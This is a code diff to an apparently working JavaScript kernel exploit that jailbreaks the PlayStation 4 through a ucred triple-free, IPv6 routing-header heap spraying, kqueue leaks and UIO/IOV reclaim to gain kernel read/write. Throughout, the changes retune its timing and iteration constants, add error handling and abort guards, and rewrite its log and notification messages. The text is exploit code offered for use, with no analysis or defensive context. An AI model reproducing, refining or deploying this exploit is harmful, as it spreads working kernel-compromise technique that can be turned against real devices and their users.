@@ -115,10 +115,10 @@ var MSG_IOV_NUM = 0x17; // 23
 
 // Params for kext stability
 var IPV6_SOCK_NUM = 96;
-var IOV_THREAD_NUM = 6;
-var UIO_THREAD_NUM = 6;
+var IOV_THREAD_NUM = 8;
+var UIO_THREAD_NUM = 8;
 var MAIN_LOOP_ITERATIONS = 3;
-var TRIPLEFREE_ITERATIONS = 8;
+var TRIPLEFREE_ITERATIONS = 6;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 100;
 var MAIN_CORE = 4;
@@ -787,14 +787,16 @@ function find_twins() {
   var spray_add = spray_rthdr.add(0x04);
   var leak_add = leak_rthdr.add(0x04);
   while (count < MAX_ROUNDS_TWIN) {
-    if (debugging.info.memory.available === 0) {
+    if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory && debugging.info.memory.available === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 5) {
         log(' Jailbreak failed!');
         cleanup();
         return false;
       }
-    } else zeroMemoryCount = 0;
+    } else {
+      zeroMemoryCount = 0;
+    }
     for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
 
@@ -936,10 +938,17 @@ function netctrl_exploit() {
   yield_to_render(exploit_phase_setup);
 }
 function exploit_phase_setup() {
-  var ok = setup();
+  if (exploit_end) return;
+  var ok = false;
+  try {
+    ok = setup();
+  } catch (e) {
+    ok = false;
+  }
   if (!ok) {
-    log('Setup failed, aborting exploit.');
+    log('Setup failed — aborting.');
     cleanup();
+    exploit_end = true;
     return;
   }
   log('Workers spawned');
@@ -948,18 +957,28 @@ function exploit_phase_setup() {
   yield_to_render(exploit_phase_trigger);
 }
 function exploit_phase_trigger() {
+  if (exploit_end) return;
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
-    log('Failed to acquire kernel R/W');
+    log('Max attempts reached — stopping.');
+    log('Restart your ps4 ########');
     cleanup();
+    exploit_end = true;
     return;
   }
   exploit_count++;
-  log('Triggering ..... ');
-  if (!trigger_ucred_triplefree()) {
+  log('Triggering attempt ' + exploit_count + '/' + MAIN_LOOP_ITERATIONS);
+  var ok = false;
+  try {
+    ok = trigger_ucred_triplefree();
+  } catch (e) {
+    ok = false;
+  }
+  if (!ok) {
+    log('Trigger failed — retrying...');
     yield_to_render(exploit_phase_trigger);
     return;
   }
-  log('Leaking .....');
+  log('Leaking...');
   yield_to_render(exploit_phase_leak);
 }
 function exploit_phase_leak() {
@@ -971,34 +990,38 @@ function exploit_phase_leak() {
     ok = false;
   }
   if (!ok) {
-    log('Leak failed — retrying...');
+    log('Leak failed — retrying triggering...');
+    log('Retry triggering...');
     yield_to_render(exploit_phase_trigger);
     return;
   }
   yield_to_render(exploit_phase_rw);
 }
 function exploit_phase_rw() {
+  if (exploit_end) return;
   try {
     setup_arbitrary_rw();
   } catch (e) {
-    log('R/W setup failed — Restart your ps4');
+    log('R/W setup failed — Restart your ps4...');
+    cleanup();
+    sched_yield();
     return;
   }
-
-  yield_to_render(exploit_phase_jailbreak);
   log('R/W OK — moving to jailbreak...');
   log('Stability by M.ELHOUT');
+  yield_to_render(exploit_phase_jailbreak);
   utils.notify('Jailbreak Success');
   utils.notify('Stability by M.ELHOUT');
+  utils.notify('< Sob7an allh W b Hamdh Sob7an allh alazeem >');
 }
 function exploit_phase_jailbreak() {
+  if (exploit_end) return;
   try {
     jailbreak();
   } catch (e) {
     log('Jailbreak error.');
   }
   log('Jailbreak completed successfully');
-  utils.notify('< Sob7an allh W b Hamdh Sob7an allh alazeem >');
 }
 function safe_fhold_fd(fd, label) {
   if (fd < 0) {
@@ -1068,6 +1091,7 @@ function setup_arbitrary_rw() {
     remove_rthr_from_socket(ipv6_socks[triplets[2]]);
   } catch (e) {}
   remove_uaf_file();
+  log('Arbitrary R/W ready');
 }
 function find_allproc() {
   // Use existing master_pipe instead of creating new one
@@ -1475,7 +1499,7 @@ function leak_kqueue() {
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
   var count = 0;
-  var MAX_KQ = 5000;
+  var MAX_KQ = 6000;
   while (count < MAX_KQ) {
     count++;
     kq = kqueue();
@@ -1487,9 +1511,9 @@ function leak_kqueue() {
     // تصفير جزء من leak_rthdr قبل القراءة (لتفادي بقايا قديمة)
     write64(magic_add, 0);
     write64(leak_rthdr.add(0x98), 0);
+    sched_yield(); // تهوية صغيرة قبل get_rthdr
 
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
-
     var magic = read64(magic_add);
     var fdp = read64(leak_rthdr.add(0x98));
     if (magic.eq(magic_val) && !fdp.eq(0)) {
@@ -1498,11 +1522,11 @@ function leak_kqueue() {
     close(kq);
     sched_yield();
   }
+  sched_yield();
   if (count >= MAX_KQ) {
     log('leak_kqueue: exceeded MAX_KQ iterations');
     return false;
   }
-
   kl_lock = read64(leak_rthdr.add(0x60));
   kq_fdp = read64(leak_rthdr.add(0x98));
   if (kq_fdp.eq(0)) {
@@ -1564,12 +1588,12 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 // =========================
 
 // UIO reclaim max loops
-var KREAD_MAX_UIO_RECLAIM = 3000;
-var KWRITE_MAX_UIO_RECLAIM = 3000;
+var KREAD_MAX_UIO_RECLAIM = 2000;
+var KWRITE_MAX_UIO_RECLAIM = 2000;
 
 // IOV reclaim max loops
-var KREAD_MAX_IOV_RECLAIM = 1200;
-var KWRITE_MAX_IOV_RECLAIM = 1200;
+var KREAD_MAX_IOV_RECLAIM = 500;
+var KWRITE_MAX_IOV_RECLAIM = 500;
 
 // Memory exhaustion threshold
 var MEMORY_ZERO_THRESHOLD = 3;
